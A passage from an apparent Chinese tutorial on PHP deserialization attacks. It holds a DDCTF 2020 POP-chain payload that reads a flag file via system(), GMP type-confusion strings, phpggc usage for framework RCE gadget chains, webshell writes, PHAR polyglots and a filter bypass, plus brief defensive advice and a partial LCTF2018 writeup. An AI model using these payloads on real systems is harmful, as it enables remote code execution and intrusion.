<span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> ShowOff();
<span class="hljs-variable">$bullet</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bullet&#x27;</span>];

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$bullet</span>))
&#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Give Me Something!&quot;</span>);
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$bullet</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)
&#123;
    <span class="hljs-variable">$infos</span> = <span class="hljs-keyword">new</span> Info();
&#125;<span class="hljs-keyword">else</span>
&#123;
    <span class="hljs-variable">$obstacle1</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;
    <span class="hljs-variable">$obstacle2</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;
    <span class="hljs-variable">$mc</span> = <span class="hljs-keyword">new</span> MyClass();
    <span class="hljs-variable">$mc</span>-&gt;flag = <span class="hljs-string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;
    @unserialize(<span class="hljs-variable">$bullet</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$mc</span>-&gt;get_flag();
&#125;
</code></pre></div>



<p><strong>思路1</strong>：</p>
<ul>
<li><p>ShowOff类的__wake_up调用MiddleMan的__unset</p>
</li>
<li><p>然后利用$func调用MyClass的get_flag方法</p>
</li>
<li><p>find 方法可以执行命令。前提是存在/HackersForever</p>
</li>
<li><p>payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//error_reporting(0);</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;-exec cat /flag &#123;&#125; ;&#x27;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;kw0ng = <span class="hljs-number">2</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> system(<span class="hljs-string">&#x27;find /HackersForever &#x27;</span> . escapeshellcmd(<span class="hljs-keyword">$this</span>-&gt;flag));
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HintClass</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;hint))
        &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);
        &#125;
        <span class="hljs-keyword">$this</span>-&gt;execute(<span class="hljs-keyword">$this</span>-&gt;hint);
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowOff</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;
<span class="hljs-comment">//        echo &quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;;</span>
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;contents();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;
        <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;page-&gt;cont);
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiddleMan</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$func</span> = <span class="hljs-keyword">$this</span>-&gt;content;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);
    &#125;
&#125;

<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ShowOff();

<span class="hljs-variable">$a</span>-&gt;page  = <span class="hljs-keyword">new</span> MiddleMan();
<span class="hljs-variable">$a</span>-&gt;page-&gt;content = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> MyClass(),<span class="hljs-string">&#x27;get_flag&#x27;</span>);

<span class="hljs-variable">$payload</span> = urlencode(serialize(<span class="hljs-variable">$a</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;\n&quot;</span>;
<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;http://127.0.0.1/ddctf2020/?bullet=&#x27;</span>.<span class="hljs-variable">$payload</span>),<span class="hljs-string">&quot;\n&quot;</span>;</code></pre></div>







</li>
</ul>
<p><strong>思路2</strong>：</p>
<ul>
<li><p>利用php的GMP类型混淆漏洞</p>
</li>
<li><p>两种利用方式，一种是利用有<code>__wakeup</code>的类，一种是利用<code>DateInterval</code></p>
</li>
<li><p>利用方式1：MyClass-&gt;__wake_up</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;1&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:14:&quot;-exec cat &#123;&#125; ;&quot;;i:0;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:2;&#125;&#125;&#x27;</span>;
<span class="hljs-variable">$bullet</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>;</code></pre></div>

<p>最后一个<code>O</code>类型里面是存在<code>__wakeup</code>且<code>__wakeup</code>的内容是给属性赋值的类，关键是要覆盖的类必须是指定顺序实例化，比如这里，<code>MyClass</code>是第四个实例化，所以<code>MyClass</code>的<code>__wakeup()</code>必须是</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;kw0ng = <span class="hljs-number">4</span>;
&#125;</code></pre></div>

<p>但是这里的代码写死了2，用这个没法执行。还是得用DateInterval</p>
</li>
<li><p>利用方式2：DateInterval</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;4&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:20:&quot;-exec cat /flag &#123;&#125; ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#x27;</span>;
<span class="hljs-variable">$exploit</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>;</code></pre></div>









</li>
</ul>
<h2 id="0x09-php反序列化语句生成工具：phpggc"><a href="#0x09-php反序列化语句生成工具：phpggc" class="headerlink" title="0x09 php反序列化语句生成工具：phpggc"></a>0x09 php反序列化语句生成工具：<a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a></h2><p>可以生成各种框架的利用链、phar文件等</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ambionics/phpggc.git</code></pre></div>



<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>Run <code>./phpggc -l</code> to obtain a list of gadget chains:</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash">$ ./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                        TYPE             VECTOR         I    
CodeIgniter4/RCE1                         4.0.0-beta.1 &lt;= 4.0.0-rc.4     rce              __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.0.3+           rce              __destruct          
Doctrine/FW1                              ?                              file_write       __toString     *    
Drupal7/FD1                               7.0 &lt; ?                        file_delete      __destruct     *    
Drupal7/RCE1                              7.0.8 &lt; ?                      rce              __destruct     *    
Guzzle/FW1                                6.0.0 &lt;= 6.3.3+                file_write       __destruct          
Guzzle/INFO1                              6.0.0 &lt;= 6.3.2                 phpinfo()        __destruct     *    
Guzzle/RCE1                               6.0.0 &lt;= 6.3.2                 rce              __destruct     *    
Laminas/FD1                               &lt;= 2.11.2                      file_delete      __destruct          
Laravel/RCE1                              5.4.27                         rce              __destruct          
Laravel/RCE2                              5.5.39                         rce              __destruct          
Laravel/RCE3                              5.5.39                         rce              __destruct     *    
Laravel/RCE4                              5.5.39                         rce              __destruct          
Laravel/RCE5                              5.8.30                         rce              __destruct     *    
Laravel/RCE6                              5.5.*                          rce              __destruct     *    
Magento/FW1                               ? &lt;= 1.9.4.0                   file_write       __destruct     *    
Magento/SQLI1                             ? &lt;= 1.9.4.0                   sql_injection    __destruct          
Monolog/RCE1                              1.18 &lt;= 2.0.2                  rce              __destruct          
Monolog/RCE2                              1.5 &lt;= 1.17                    rce              __destruct          
Monolog/RCE3                              1.1.0 &lt;= 1.10.0                rce              __destruct          
Phalcon/RCE1                              &lt;= 1.2.2                       rce              __wakeup       *    
Pydio/Guzzle/RCE1                         &lt; 8.2.2                        rce              __toString          
Slim/RCE1                                 3.8.1                          rce              __toString          
SwiftMailer/FD1                           -5.4.12+, -6.2.1+              file_delete      __destruct          
SwiftMailer/FW1                           5.1.0 &lt;= 5.4.8                 file_write       __toString          
SwiftMailer/FW2                           6.0.0 &lt;= 6.0.1                 file_write       __toString          
SwiftMailer/FW3                           5.0.1                          file_write       __toString          
SwiftMailer/FW4                           4.0.0 &lt;= ?                     file_write       __destruct          
Symfony/FW1                               2.5.2                          file_write       DebugImport    *    
Symfony/FW2                               3.4                            file_write       __destruct          
Symfony/RCE1                              3.3                            rce              __destruct     *    
Symfony/RCE2                              2.3.42 &lt; 2.6                   rce              __destruct     *    
Symfony/RCE3                              2.6 &lt;= 2.8.32                  rce              __destruct     *    
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7    rce              __destruct     *    
ThinkPHP/RCE1                             5.1.x-5.2.x                    rce              __destruct     *    
WordPress/Dompdf/RCE1                     &lt;= 0.8.5+                      rce              __destruct     *    
WordPress/Dompdf/RCE2                     0.7.0 &lt;= 0.8.4                 rce              __destruct     *    
WordPress/Guzzle/RCE1                     4.0.0 &lt;= 6.4.1+                rce              __toString     *    
WordPress/Guzzle/RCE2                     4.0.0 &lt;= 6.4.1+                rce              __destruct     *    
WordPress/P/EmailSubscribers/RCE1         4.0 &lt;= 4.4.7+                  rce              __destruct     *    
WordPress/P/EverestForms/RCE1             1.0 &lt;= 1.6.7+                  rce              __destruct     *    
WordPress/P/WooCommerce/RCE1              3.4.0 &lt;= 4.1.0+                rce              __destruct     *    
WordPress/P/YetAnotherStarsRating/RCE1    ? &lt;= 1.8.6                     rce              __destruct     *    
Yii/RCE1                                  1.1.20                         rce              __wakeup       *    
ZendFramework/FD1                         ? &lt;= 1.12.20                   file_delete      __destruct          
ZendFramework/RCE1                        ? &lt;= 1.12.20                   rce              __destruct     *    
ZendFramework/RCE2                        1.11.12 &lt;= 1.12.20             rce              __toString     *    
ZendFramework/RCE3                        2.0.1 &lt;= ?                     rce              __destruct</code></pre></div>

<p>Filter gadget chains:</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash">$ ./phpggc -l laravel

Gadget Chains
-------------

NAME                                      VERSION                        TYPE             VECTOR         I    
Laravel/RCE1                              5.4.27                         rce              __destruct          
Laravel/RCE2                              5.5.39                         rce              __destruct          
Laravel/RCE3                              5.5.39                         rce              __destruct     *    
Laravel/RCE4                              5.5.39                         rce              __destruct          
Laravel/RCE5                              5.8.30                         rce              __destruct     *    
Laravel/RCE6                              5.5.*                          rce              __destruct     *</code></pre></div>

<p>Every gadget chain has:</p>
<ul>
<li>Name: Name of the framework/library</li>
<li>Version: Version of the framework/library for which gadgets are for</li>
<li>Type: Type of exploitation: RCE, File Write, File Read, Include…</li>
<li>Vector: the vector to trigger the chain after the unserialize (<code>__destruct()</code>, <code>__toString()</code>, <code>offsetGet()</code>, …)</li>
<li>Informations: Other informations about the chain</li>
</ul>
<p>Use <code>-i</code> to get detailed information about a chain:</p>
<div class="hljs code-wrapper"><pre><code class="hljs ada">$ ./phpggc -i symfony/rce1
Name           : <span class="hljs-type">Symfony</span>/RCE1
Version        : 3.3
<span class="hljs-keyword">Type</span>           <span class="hljs-type">: </span>rce
Vector         : __<span class="hljs-type">destruct</span>
Informations   : 
Exec through proc_open()

./phpggc Symfony/RCE1 &lt;command&gt;</code></pre></div>

<p>Once you have selected a chain, run <code>./phpggc &lt;gadget-chain&gt; [parameters]</code> to obtain the payload. For instance, to obtain a payload for Monolog, you’d do:</p>
<div class="hljs code-wrapper"><pre><code class="hljs roboconf">$ ./phpggc monolog/rce1 assert &#x27;phpinfo()&#x27;
O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;<span class="hljs-attribute">s</span>:9:&quot;*socket&quot;;<span class="hljs-attribute">O</span>:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;<span class="hljs-attribute">r</span>:2;<span class="hljs-attribute">s</span>:13:&quot;*bufferSize&quot;;<span class="hljs-attribute">i</span>:-1;<span class="hljs-attribute">s</span>:9:&quot;*buffer&quot;;<span class="hljs-attribute">a</span>:1:&#123;i:0;<span class="hljs-attribute">a</span>:2:&#123;i:0;<span class="hljs-attribute">s</span>:10:&quot;phpinfo();&quot;;<span class="hljs-attribute">s</span>:5:&quot;level&quot;;<span class="hljs-attribute">N;&#125;&#125;s</span>:8:&quot;*level&quot;;<span class="hljs-attribute">N;s</span>:14:&quot;*initialized&quot;;<span class="hljs-attribute">b</span>:1;<span class="hljs-attribute">s</span>:14:&quot;*bufferLimit&quot;;<span class="hljs-attribute">i</span>:-1;<span class="hljs-attribute">s</span>:13:&quot;*processors&quot;;<span class="hljs-attribute">a</span>:2:&#123;i:0;<span class="hljs-attribute">s</span>:7:&quot;current&quot;;<span class="hljs-attribute">i</span>:1;<span class="hljs-attribute">s</span>:6:&quot;assert&quot;;&#125;&#125;&#125;</code></pre></div>

<p>For a file write using SwiftMailer, you’d do:</p>
<div class="hljs code-wrapper"><pre><code class="hljs awk">$ echo <span class="hljs-string">&#x27;It works !&#x27;</span> &gt; <span class="hljs-regexp">/tmp/</span>data
$ .<span class="hljs-regexp">/phpggc swiftmailer/</span>fw1 <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.php <span class="hljs-regexp">/tmp/</span>data
O:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;Swift_Message&quot;</span>:<span class="hljs-number">8</span>:&#123;...&#125;</code></pre></div>

<h4 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h4><p>The <code>--wrapper</code> (<code>-w</code>) option allows you to define a PHP file containing the following functions:</p>
<ul>
<li><code>process_parameters($parameters)</code>: Called right <strong>before</strong> <code>generate()</code>, allows to change parameters</li>
<li><code>process_object($object)</code>: Called right <strong>before</strong> <code>serialize()</code>, allows to change the object</li>
<li><code>process_serialized($serialized)</code>: Called right <strong>after</strong> <code>serialize()</code>, allows to change the serialized string</li>
</ul>
<p>For instance, if the vulnerable code looks like this:</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);
<span class="hljs-keyword">print</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;message&#x27;</span>];</code></pre></div>

<p>You could use a <code>__toString()</code> chain, wrapping it like so:</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment"># /tmp/my_wrapper.php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process_object</span>(<span class="hljs-params"><span class="hljs-variable">$object</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(
        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$object</span>
    );
&#125;</code></pre></div>

<p>And you’d call phpggc like so:</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id
a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>;O:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;Slim\Http\Response&quot;</span>:<span class="hljs-number">2</span>:&#123;...&#125;&#125;</code></pre></div>









<h4 id="PHAR-GGC"><a href="#PHAR-GGC" class="headerlink" title="PHAR(GGC)"></a>PHAR(GGC)</h4><h5 id="History"><a href="#History" class="headerlink" title="History"></a>History</h5><p>At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (<code>file_exists</code>, <code>fopen</code>, etc.). The paper is <a target="_blank" rel="noopener" href="https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf">here</a>.</p>
<h5 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h5><p>PHAR archives come in three different formats: <strong>PHAR, TAR, and ZIP</strong>. The three of them are supported by PHPGGC. Polyglot files can be generated using <code>--phar-jpeg</code> (<code>-pj</code>). Other options are available (use <code>-h</code>).</p>
<h5 id="Examles"><a href="#Examles" class="headerlink" title="Examles"></a>Examles</h5><div class="hljs code-wrapper"><pre><code class="hljs bash">$ <span class="hljs-comment"># Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar</span>
$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id
$ <span class="hljs-comment"># Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar</span>
$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id
$ <span class="hljs-comment"># Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar</span>
$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id</code></pre></div>



<h4 id="Encoders"><a href="#Encoders" class="headerlink" title="Encoders"></a>Encoders</h4><p>Arguments allow to modify the way the payload is output. For instance, <code>-u</code> will URL encode it, and <code>-b</code> will convert it to base64. <strong>Payloads often contain NULL bytes and cannot be copy/pasted as-is</strong>. Use <code>-s</code> for a soft URL encode, which keeps the payload readable.</p>
<p>The encoders can be chained, and as such <strong>the order is important</strong>. For instance, <code>./phpggc -b -u -u slim/rce1 system id</code> will <strong>base64</strong> the payload, then <strong>URLencode it twice.</strong></p>
<h4 id="Advanced-Enhancements"><a href="#Advanced-Enhancements" class="headerlink" title="Advanced: Enhancements"></a>Advanced: Enhancements</h4><h5 id="Fast-destruct"><a href="#Fast-destruct" class="headerlink" title="Fast destruct"></a>Fast destruct</h5><p>PHPGGC implements a <code>--fast-destruct</code> (<code>-f</code>) flag, that will make sure your serialized object will be destroyed right after the <code>unserialize()</code> call, and not at the end of the script. <strong>I’d recommend using it for every <code>__destruct</code> vector</strong>, as it improves reliability. For instance, if PHP script raises an exception after the call, the <code>__destruct</code> method of your object might not be called. As it is processed at the same time as encoders, it needs to be set first.</p>
<div class="hljs code-wrapper"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/phpggc -f -s slim/</span>rce1 system id
a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">7</span>;O:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;Slim\Http\Response&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;...</span></code></pre></div>





<h4 id="ASCII-Strings"><a href="#ASCII-Strings" class="headerlink" title="ASCII Strings"></a>ASCII Strings</h4><p>Uses the <code>S</code> serialization format instead of the standard <code>s</code>. This replaces every non-ASCII value to an hexadecimal representation: <strong><code>s:5:&quot;A&lt;null_byte&gt;B&lt;cr&gt;&lt;lf&gt;&quot;;̀</code> -&gt; <code>S:5:&quot;A\00B\09\0D&quot;;</code></strong> This can be useful when for some reason non-ascii characters are not allowed (NULL BYTE for instance). Since payloads generally contain them, this makes sure that the payload consists only of ASCII values. <em>Note: this is experimental and it might not work in some cases.</em></p>
<h4 id="Plus-Numbers"><a href="#Plus-Numbers" class="headerlink" title="Plus Numbers"></a>Plus Numbers</h4><p>Sometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as <code>/O:[0-9]+:</code>. This is easily bypassed using <code>O:+123:...</code> instead of <code>O:123:</code>. One can use <code>--plus-numbers &lt;types&gt;</code>, or <code>-n &lt;types&gt;</code>, to automatically add these <code>+</code> signs in front of symbols. For instance, to obfuscate objects and strings, one can use: <code>--n Os</code>. Please note that since PHP 7.2, only i and d (float) types can have a +.</p>
<h3 id="phpggc流程分析"><a href="#phpggc流程分析" class="headerlink" title="phpggc流程分析"></a>phpggc流程分析</h3><h3 id="phpggc拓展"><a href="#phpggc拓展" class="headerlink" title="phpggc拓展"></a>phpggc拓展</h3><h2 id="0x10-php反序列化防御方法"><a href="#0x10-php反序列化防御方法" class="headerlink" title="0x10 php反序列化防御方法"></a>0x10 php反序列化防御方法</h2><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><h4 id="动态调用与危险函数"><a href="#动态调用与危险函数" class="headerlink" title="动态调用与危险函数"></a>动态调用与危险函数</h4><ol>
<li>在写到动态调用和危险函数时，务必对变量和方法进行回溯。查看变量是否是可控的。</li>
<li>在容许的情况下，使用静态属性进行动态调用可以防止可控变量调用危险函数。</li>
<li>在调用<code>$this-&gt;aaa-&gt;bbb()</code>这样类似的结构前可以利用<code>instanceof</code>进行检查，查看其是否是期望调用的类。</li>
</ol>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol>
<li>注意尽量少的在魔法方法中写入可以调用大量其它方法的方法。尤其是<code>__destruct</code>和<code>__wakeup</code>。</li>
<li>注意在公共且不需要参数的方法中不要直接调用危险函数和动态调用。</li>
<li>在不需要<code>__wakeup</code>方法且类没必要序列化时，可以考虑<strong>使用<code>__wakeup</code>阻止反序列化。</strong></li>
</ol>
<h3 id="最最最最最重要的"><a href="#最最最最最重要的" class="headerlink" title="最最最最最重要的"></a>最最最最最重要的</h3><p>不要让unserialize和文件类函数用户可控！！！<br>不要让unserialize和文件类函数用户可控！！！<br>不要让unserialize和文件类函数用户可控！！！</p>
<h2 id="0x11-php-反序列化刷题-转载"><a href="#0x11-php-反序列化刷题-转载" class="headerlink" title="0x11 php 反序列化刷题(转载)"></a>0x11 <a target="_blank" rel="noopener" href="https://ca0y1h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php 反序列化刷题</a>(转载)</h2><h3 id="LCTF2018-Bestphp’s-revenge"><a href="#LCTF2018-Bestphp’s-revenge" class="headerlink" title="LCTF2018 Bestphp’s revenge"></a>LCTF2018 Bestphp’s revenge</h3><blockquote>
<p>这篇文章分析的很到位：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164569#h2-5">https://www.anquanke.com/post/id/164569#h2-5</a></p>
</blockquote>
<h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul>
<li>session反序列化</li>
<li>Soapclient + ssrf</li>
<li>CRLF</li>
</ul>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>index.php</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;
call_user_func(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);
session_start();
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
&#125;
var_dump(<span class="hljs-variable">$_SESSION</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(reset(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);
call_user_func(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span>
</code></pre></div>

<p>flag.php</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">only localhost can get flag!
session_start(); 
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>; 
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; 
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123; 
	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>; 
&#125; 
only localhost can get flag!</code></pre></div>



<p>思路如下：</p>
<ol>
<li>利用第4行回调函数来调用<code>session_start()</code>用于覆盖session序列化引擎为php_serilaze；</li>
<li>构造SSRF的Soap类的序列化字符串配合上面的序列化注入写入session文件，并且构造的序列化字符串中利用了CRLF漏洞写入了我们规定的seesion_id；</li>
<li>然后再通过第4行的回调函数调用<code>extract()</code>函数用于变量覆盖，覆盖掉变量b为回调函数<code>call_user_func</code>；</li>
